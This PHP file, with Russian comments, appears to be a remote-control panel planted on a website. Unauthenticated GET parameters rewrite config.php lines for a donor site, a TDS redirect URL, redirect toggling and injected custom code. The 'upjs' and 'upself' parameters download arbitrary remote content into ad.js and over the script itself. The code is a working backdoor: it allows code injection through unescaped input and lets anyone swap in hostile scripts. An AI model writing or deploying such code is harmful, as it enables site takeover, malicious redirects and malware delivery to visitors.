<?php
//set donor
if(isset($_GET['donor'])) {
$line=3; // номер строки, которую нужно изменить
$replace='$config[\'site\'] = \''.trim($_GET["donor"]).'\';'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
}

//set site url
if(isset($_GET['domain'])) {
$line=4; // номер строки, которую нужно изменить
$replace='$config[\'my_domain\'] = \''.trim($_GET["domain"]).'\';'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
}

//set tds url
if(isset($_GET['tdsurl'])) {
$line=26; // номер строки, которую нужно изменить
$replace='$config[\'redirect_url\'] = \''.trim($_GET["tdsurl"]).'\';'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
}

//redirect on-off
if(isset($_GET['redirect'])) {
	if ($_GET['redirect']=='off'){
		$line=25; // номер строки, которую нужно изменить
$replace='$config[\'redirect\'] = \'no\';'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
	}
if ($_GET['redirect']=='on'){
		$line=25; // номер строки, которую нужно изменить
$replace='$config[\'redirect\'] = \'all\';'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
	}
}

//custom code on-off
if(isset($_GET['customcode'])) {
	if ($_GET['customcode']=='off'){
		$line=34; // номер строки, которую нужно изменить
$replace='$config[\'analytics\'] = FALSE;'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
	}
if ($_GET['customcode']=='on'){
		$line=34; // номер строки, которую нужно изменить
$replace='$config[\'analytics\'] = TRUE;'; // на что нужно изменить
$filename = 'config.php'; // имя файла 
$file = file($filename);
$file[$line-1] = $replace.PHP_EOL;
file_put_contents($filename, join('', $file));
	}
}

//update ad.js
if(isset($_GET['upjs'])) {
$data=file_get_contents($_GET["upjs"]);
file_put_contents('ad.js', $data);
}
//update self
if(isset($_GET['upself'])) {
$data=file_get_contents($_GET["upself"]);
file_put_contents('setset.php', $data);
}
?>